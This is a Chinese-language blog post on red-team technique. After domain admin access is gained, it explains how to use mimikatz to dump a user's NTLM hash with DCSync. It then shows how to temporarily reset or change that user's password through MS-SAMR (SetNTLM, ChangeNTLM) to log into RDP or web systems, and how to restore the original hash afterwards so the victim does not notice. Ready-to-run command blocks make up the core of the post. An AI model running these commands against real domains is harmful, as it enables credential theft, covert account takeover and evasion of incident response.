在实战中，我们经常会碰到这么一种场景。拿到域控的权限了，把域内所有用户[哈希](https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020)都导出来了。为了找靶标，需要登录指定用户的机器或其他web系统，但是指定用户的hash未能解除明文密码，而RDP和web又不支持hash登录，这时，渗透陷入了困境。有的朋友可能会说，既然都有域控的权限了，那可以把指定用户的密码修改为我们已知的密码再利用，但是这种方法不可行，第一是演习规则中禁止修改用户密码，第二是用户如果发现自己的密码被修改了的话，就肯定知道被入侵了，立马会进行溯源，会打草惊蛇。

针对这种情况，我们有以下两种解决方案：

*   使用SetNTLM将用户密码重置，登录目标系统后，再将原密码还原
*   使用ChangeNTLM修改用户密码，登录目标系统后，再将原密码还原

注：两种方法的原理都是调用了MS-SAMR协议，不同的是ChangeNTLM是调用SamrChangePasswordUser这一API来修改用户密码，而SetNTLM是通过SamrSetInformationUser来重置用户密码，但是由于ChangeNTLM受组策略密码安全设置的影响较大，所以在实战中我们一般利用SetNTLM。

SetNTLM
-------

该功能可以将指定域用户的密码重置为新的密码

利用条件：当前权限需要对要修改的用户有重置密码权限，域控对所有用户均有重置密码权限。

![](https://img-blog.csdnimg.cn/img_convert/7b8dcab9b58b91f738182a24f279b1b4.png)

### 实战

```
#查询指定用户test的NTLM Hash      
lsadump::dcsync /domain:xie.com /user:test /csv       
#重置指定用户test的密码为123456      
lsadump::SETNTLM /server:10.211.55.4 /user:test /password:123456                  
#重置指定用户test的NTLM hash为74520a4ec2626e3638066146a0d5ceae      
lsadump::SETNTLM /server:10.211.55.4 /user:test /ntlm:74520a4ec2626e3638066146a0d5ceae
```


![](https://img-blog.csdnimg.cn/img_convert/4e37f43e08e58632616596199db7f496.png)

![](https://img-blog.csdnimg.cn/img_convert/e4fdb9eca59ffc083b0635058c8402e2.png)

ChangeNTLM
----------

该功能可以修改指定域用户的密码为新的密码。

利用条件：当前权限需要对要修改的用户有修改密码权限，默认Everyone都拥有。所以在拿到用户的密码[hash](https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020)后都可以进行密码更改。

![](https://img-blog.csdnimg.cn/img_convert/4503b64d2462bcfb6ad47b585883dcda.png)

有一个小坑就是，如果域内密码策略进行了限制，设置了 密码最短使用期限 为1天的话，这样我们每天只能修改一次密码。并且如果测试设置了强制密码历史规则时，我们则不能将密码修改为原密码。

![](https://img-blog.csdnimg.cn/img_convert/cbb643d0eeb1bbdcd72313b7f273a13b.png)

### 实战

```
#查询指定用户test2的NTLM Hash      
lsadump::dcsync /domain:xie.com /user:test2 /csv       
#修改指定test2密码为P@ssW@rd123456      
lsadump::changentlm /server:10.211.55.4 /user:test2 /old:74520a4ec2626e3638066146a0d5ceae /newpassword:P@ssW@rd123456      
#修改指定test2 NTLM hash为74520a4ec2626e3638066146a0d5ceae      
lsadump::changentlm /server:10.211.55.4 /user:test2 /oldpassword:P@ssW@rd123456 /new:74520a4ec2626e3638066146a0d5ceae
```


![](https://img-blog.csdnimg.cn/img_convert/0168dd4209393ca4429309b1f7cf5fab.png)

出现这种错误是由于目标域设置了 密码最短使用期限 为1天 或 强制密码历史 。

![](https://img-blog.csdnimg.cn/img_convert/67d5b2bd717efb5b4c06903c0e4760ff.png)

![](https://img-blog.csdnimg.cn/img_convert/cb2a9d08fdd7874b8141cb2e8812a9e2.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考：[利用MS-SAMR协议修改用户密码](https://mp.weixin.qq.com/s/QvdCtlWtn78FKXkwy9_CrA "利用MS-SAMR协议修改用户密码")

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10917 人正在系统学习中